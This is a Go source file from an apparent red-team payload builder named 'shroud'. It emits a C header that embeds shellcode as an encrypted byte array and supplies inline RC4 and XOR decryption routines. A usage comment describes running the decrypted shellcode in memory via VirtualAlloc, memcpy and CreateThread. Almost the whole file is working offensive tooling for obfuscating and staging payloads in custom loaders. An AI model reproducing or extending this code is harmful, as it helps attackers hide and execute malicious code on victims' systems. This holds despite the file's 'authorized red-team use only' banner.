// cformat.go — emits a standalone C header (payload.h) containing the
// (optionally encrypted) shellcode as a byte array, the crypto material, and
// — for RC4/XOR — a ready-to-compile decrypt function. For embedding shroud
// output in other (C/C++) loaders when you don't want a Go binary.
//
// AES is NOT inlined (a full AES implementation is too large to emit); the key
// and IV are emitted with a note to decrypt with wincrypt/openssl. RC4 and XOR
// are small enough to ship as C functions.
package payload

import (
	"fmt"
	"strings"
)

// cHeader renders the payload.h content for the active Spec.
func (b *Builder) cHeader() string {
	var sb strings.Builder
	sb.WriteString("/*\n")
	sb.WriteString(fmt.Sprintf(" * payload.h — shroud %s (%s export\n", b.Spec.Tech.ID, b.Spec.Tech.Name))
	sb.WriteString(" * Generated by shroud (Go rewrite). Authorized red-team use only.\n")
	sb.WriteString(" *\n")
	sb.WriteString(" * Embed shroud_payload[] in your own loader. Decrypt with the matching\n")
	sb.WriteString(" * function/key below if a crypto layer was active.\n")
	sb.WriteString(" */\n")
	sb.WriteString("#ifndef SHROUD_PAYLOAD_H\n")
	sb.WriteString("#define SHROUD_PAYLOAD_H\n")
	sb.WriteString("#include <stddef.h>\n")
	sb.WriteString("#include <stdint.h>\n\n")

	// payload
	sb.WriteString(cArray("shroud_payload", b.Spec.EncPayload))
	sb.WriteString(fmt.Sprintf("#define SHROUD_PAYLOAD_LEN %d\n\n", len(b.Spec.EncPayload)))

	switch b.Spec.Crypto {
	case "aes":
		sb.WriteString("/* AES-256-CBC at rest. Decrypt with your AES lib (WinCrypt/openssl):\n")
		sb.WriteString(" *   aes_256_cbc_decrypt(shroud_payload, SHROUD_PAYLOAD_LEN, shroud_aes_key, shroud_aes_iv)\n")
		sb.WriteString(" * PKCS7 padding is applied; strip the last N bytes where N = final byte. */\n")
		sb.WriteString(cArray("shroud_aes_key", b.Spec.AESKey))
		sb.WriteString(cArray("shroud_aes_iv", b.Spec.AESIV))
	case "rc4":
		sb.WriteString("/* RC4 at rest. shroud_rc4_decrypt() is inlined below (symmetric). */\n")
		sb.WriteString(cArray("shroud_rc4_key", b.Spec.RC4Key))
		sb.WriteString(fmt.Sprintf("#define SHROUD_RC4_KEY_LEN %d\n\n", len(b.Spec.RC4Key)))
		sb.WriteString(rc4CFunc)
	case "xor":
		sb.WriteString("/* XOR at rest. shroud_xor_decrypt() is inlined below. */\n")
		sb.WriteString(cArray("shroud_xor_key", b.Spec.XORKey))
		sb.WriteString(fmt.Sprintf("#define SHROUD_XOR_KEY_LEN %d\n\n", len(b.Spec.XORKey)))
		sb.WriteString(xorCFunc)
	default:
		sb.WriteString("/* No crypto layer — shroud_payload[] is raw shellcode; no decryption needed. */\n\n")
	}

	sb.WriteString("/* Usage:\n")
	sb.WriteString(" *   uint8_t buf[SHROUD_PAYLOAD_LEN];\n")
	switch b.Spec.Crypto {
	case "rc4":
		sb.WriteString(" *   shroud_rc4_decrypt(buf, shroud_payload, SHROUD_PAYLOAD_LEN);\n")
	case "xor":
		sb.WriteString(" *   shroud_xor_decrypt(buf, shroud_payload, SHROUD_PAYLOAD_LEN);\n")
	case "aes":
		sb.WriteString(" *   aes_256_cbc_decrypt(buf, shroud_payload, SHROUD_PAYLOAD_LEN, shroud_aes_key, shroud_aes_iv);\n")
	default:
		sb.WriteString(" *   memcpy(buf, shroud_payload, SHROUD_PAYLOAD_LEN);\n")
	}
	sb.WriteString(" *   VirtualAlloc + memcpy + CreateThread(buf, ...);\n")
	sb.WriteString(" */\n\n")
	sb.WriteString("#endif /* SHROUD_PAYLOAD_H */\n")
	return sb.String()
}

// cArray formats a byte slice as a C `static const uint8_t name[] = {...};`.
func cArray(name string, data []byte) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("static const uint8_t %s[] = {", name))
	if len(data) == 0 {
		sb.WriteString("0")
	}
	for i, x := range data {
		if i%12 == 0 {
			sb.WriteString("\n\t")
		}
		sb.WriteString(fmt.Sprintf("0x%02x, ", x))
	}
	sb.WriteString("\n};\n")
	return sb.String()
}

const rc4CFunc = `/* RC4 (symmetric — same function encrypts and decrypts). */
static void shroud_rc4_decrypt(uint8_t *out, const uint8_t *in, size_t n) {
	uint8_t s[256];
	for (int i = 0; i < 256; i++) s[i] = (uint8_t)i;
	uint8_t j = 0;
	for (int i = 0; i < 256; i++) {
		j += s[i] + shroud_rc4_key[i % SHROUD_RC4_KEY_LEN];
		uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
	}
	uint8_t a = 0, b = 0;
	for (size_t k = 0; k < n; k++) {
		a++; b += s[a];
		uint8_t t = s[a]; s[a] = s[b]; s[b] = t;
		out[k] = in[k] ^ s[(uint8_t)(s[a] + s[b])];
	}
}

`

const xorCFunc = `/* XOR (repeating key). */
static void shroud_xor_decrypt(uint8_t *out, const uint8_t *in, size_t n) {
	for (size_t i = 0; i < n; i++)
		out[i] = in[i] ^ shroud_xor_key[i % SHROUD_XOR_KEY_LEN];
}

`